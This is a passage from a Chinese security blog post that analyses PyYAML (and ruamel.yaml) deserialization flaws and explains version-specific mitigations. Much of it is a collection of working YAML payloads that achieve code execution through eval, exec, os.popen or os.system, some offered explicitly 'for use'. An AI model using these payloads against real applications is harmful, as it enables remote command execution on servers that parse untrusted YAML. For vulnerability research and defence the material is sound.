<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">[&lt;class <span class="token string">'ArithmeticError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'AssertionError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'AttributeError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'BaseException'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'BlockingIOError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'BrokenPipeError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'BufferError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'BytesWarning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ChildProcessError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ConnectionAbortedError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ConnectionError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ConnectionRefusedError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ConnectionResetError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'DeprecationWarning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'EOFError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'OSError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'Exception'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'FileExistsError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'FileNotFoundError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'FloatingPointError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'FutureWarning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'GeneratorExit'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'OSError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ImportError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ImportWarning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'IndentationError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'IndexError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'InterruptedError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'IsADirectoryError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'KeyError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'KeyboardInterrupt'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'LookupError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'MemoryError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ModuleNotFoundError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'NameError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'NotADirectoryError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'NotImplementedError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'OSError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'OverflowError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'PendingDeprecationWarning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'PermissionError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ProcessLookupError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'RecursionError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ReferenceError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ResourceWarning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'RuntimeError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'RuntimeWarning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'StopAsyncIteration'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'StopIteration'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'SyntaxError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'SyntaxWarning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'SystemError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'SystemExit'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'TabError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'TimeoutError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'TypeError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'UnboundLocalError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'UnicodeDecodeError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'UnicodeEncodeError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'UnicodeError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'UnicodeTranslateError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'UnicodeWarning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'UserWarning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ValueError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'Warning'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'OSError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'ZeroDivisionError'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'_frozen_importlib.BuiltinImporter'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'bool'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'bytearray'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'bytes'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'classmethod'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'complex'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'dict'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'enumerate'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'filter'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'float'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'frozenset'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'int'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'list'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'map'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'memoryview'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'object'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'property'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'range'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'reversed'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'set'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'slice'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'staticmethod'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'str'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'super'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'tuple'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'type'</span>&gt;<span class="token punctuation">,</span> &lt;class <span class="token string">'zip'</span>&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>现在就是找可以利用的类了，继续回到我们的constructor.py中，进一步审计 construct_python_object_apply()时，发现了一个漏洞点</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323210251975.png" alt="image-20240323210251975"></p>
<p>如果listitems不为空，则调用instance的extend()方法，将listitems中的所有元素添加到instance列表对象的末尾，instance是我们创建的实例，这里并没有定义listitems是什么，如果我们的listitems是一个字典，而且其内容有"{‘extend’:function}"，这样的话，我们就可以利用extend进行任意函数的执行了。</p>
<p>但是，经过测试，发现上面builtins中的这些类中，只有frozenset，bytes，tuple这三个类可以进行命令执行，为了搞清楚为什么，我们继续审计源码。</p>
<p>我们接着看make_python_instance()，</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323210433928.png" alt="image-20240323210433928"></p>
<p>这里只要我们的内置类可以执行<code>cls.__new__(cls, *args, **kwds)</code>这段代码，就可以根据参数来动态创建新的Python对象，从而进行命令执行。</p>
<p>所以猜测frozenset，bytes，tuple应该是可以执行上述代码，所以可以进行命令执行的</p>
<h4 id="payload">payload</h4>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">!!python/object/<span class="token property">new</span><span class="token punctuation">:</span>bytes  
        <span class="token operator">-</span> !!python/object/<span class="token property">new</span><span class="token punctuation">:</span>map  
          <span class="token operator">-</span> !!python/<span class="token property">name</span><span class="token punctuation">:</span>eval  
          <span class="token operator">-</span> [<span class="token string">"__import__\x28'pickle'\x29.load\x28open\x28'fileinfo/pik','rb'\x29\x29"</span>]
          
          
!!python/object/<span class="token property">new</span><span class="token punctuation">:</span>frozenset  
<span class="token operator">-</span> !!python/object/<span class="token property">new</span><span class="token punctuation">:</span>map  
  <span class="token operator">-</span> !!python/<span class="token property">name</span><span class="token punctuation">:</span>os.popen  
  <span class="token operator">-</span> [<span class="token string">"bash /app/fileinfo/cmd"</span>]
  
  
!!python/object/<span class="token property">new</span><span class="token punctuation">:</span>tuple  
        <span class="token operator">-</span> !!python/object/<span class="token property">new</span><span class="token punctuation">:</span>map  
          <span class="token operator">-</span> !!python/<span class="token property">name</span><span class="token punctuation">:</span>eval  
          <span class="token operator">-</span> [<span class="token string">"print(123)"</span>]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>发现都是有回显的，这里顺便附上一些文章找到的payload，供大家使用:</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#报错但是执行了
<span class="token operator">-</span> !!python/object/<span class="token property">new</span><span class="token punctuation">:</span>str
    <span class="token property">args</span><span class="token punctuation">:</span> []
    <span class="token property">state</span><span class="token punctuation">:</span> !!python/tuple
    <span class="token operator">-</span> <span class="token string">"__import__('os').system('whoami')"</span>
    <span class="token selector">- !!python/object/new:staticmethod
      args: [0]
      state:
        update: !!python/name:exec
        
        
- !!python/object/new:yaml.MappingNode
  listitems: !!str '!!python/object/apply:subprocess.Popen [whoami]'
  state:
    tag: !!str dummy
    value: !!str dummy
    extend: !!python/name:yaml.unsafe_load
    
    
#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数
!!python/object/new:type
  args: ["z", !!python/tuple [], </span><span class="token punctuation">{</span><span class="token string">"extend"</span><span class="token punctuation">:</span> !!python/<span class="token property">name</span><span class="token punctuation">:</span>exec <span class="token punctuation">}</span>]
  <span class="token property">listitems</span><span class="token punctuation">:</span> <span class="token string">"__import__('os').system('whoami')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们可以用python的内置函数<code>eval</code>（或者<code>exec</code>）来执行代码，用<code>map</code>来触发函数执行，用<code>tuple</code>将map对象转化为元组输出来（当然用<code>list</code>、<code>frozenset</code>、<code>bytes</code>都可以），用python写出来如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>变为yaml</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">yaml.load("""
<span class="token tag">!!python/object/new:tuple</span>
<span class="token punctuation">-</span> <span class="token tag">!!python/object/new:map</span>
  <span class="token punctuation">-</span> <span class="token tag">!!python/name:eval</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">]</span>
""")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>PS:</p>
<blockquote>
<blockquote>
<p>当利用上述payload测试到5.2b1版本时，发现无法利用针对!!python/object/apply标签的payload了，别的都可以利用</p>
<p>上述payload当我测试到5.4b1版本时，发现只有利用<code>针对!!python/name标签</code>的payload可以命令执行，别的payload都不能用了</p>
</blockquote>
<p>一些高版本的绕过方式，由于不是很常见，这里就不多介绍了</p>
</blockquote>
<p>当版本大于等于5.3.1:<a target="_blank" rel="noopener" href="https://github.com/yaml/pyyaml/pull/386">Prevents arbitrary code execution during python/object/new constructor by ret2libc · Pull Request #386 · yaml/pyyaml · GitHub</a></p>
<p>当版本大于等于6.0:<a target="_blank" rel="noopener" href="https://github.com/yaml/pyyaml/pull/386">Prevents arbitrary code execution during python/object/new constructor by ret2libc · Pull Request #386 · yaml/pyyaml · GitHub</a></p>
<h2 id="利用ruamel-yaml读写yaml文件">利用ruamel.yaml读写yaml文件</h2>
<p>在网上搜资料的时候，发现了也可以利用ruamel.yaml读写yaml文件，所以我在想，是不是也存在PyYaml反序列化漏洞，进行测试一下。</p>
<p>这里还是沿用PyYaml&gt;5.1的poc</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ruamel<span class="token punctuation">.</span>yaml

poc<span class="token operator">=</span> <span class="token triple-quoted-string string">b"""!!python/object/apply:os.system
- calc"""</span>

ruamel<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token comment">#py2下运行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323213632644.png" alt="image-20240323213632644"></p>
<h1>0x05 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/damoxilai/p/16707055.html">PyYAML反序列化漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7923?time__1311=n4%2BxnD0G0%3DeQwqmTe05%2Bb8e4D5i%3DrzD9YbDYwD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-5">浅谈PyYAML反序列化漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12481?time__1311=mqmhD5AKYIeUhDBqDTCgFTH%2BQ8D8IYeD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6">PyYaml反序列化漏洞详解</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonname">SecMap - 反序列化（PyYAML） </a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2024/03/23/pyyaml-fan-xu-lie-hua/">http://hybcx.xyz/2024/03/23/pyyaml-fan-xu-lie-hua/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">
                                    <span class="chip bg-color">基本知识</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
        serverURLs: '',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/03/24/metasploit-xue-xi-2/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Metasploit学习2">
                        
                        <span class="card-title">Metasploit学习2</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-03-24
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Metasploit/" class="post-category">
                                    Metasploit
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Metasploit/">
                        <span class="chip bg-color">Metasploit</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/03/23/metasploit-xue-xi/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Metasploit学习">
                        
                        <span class="card-title">Metasploit学习</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-23
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Metasploit/" class="post-category">
                                    Metasploit
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Metasploit/">
                        <span class="chip bg-color">Metasploit</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.js"></script>


<!-- 代码语言 -->


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">861.1k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
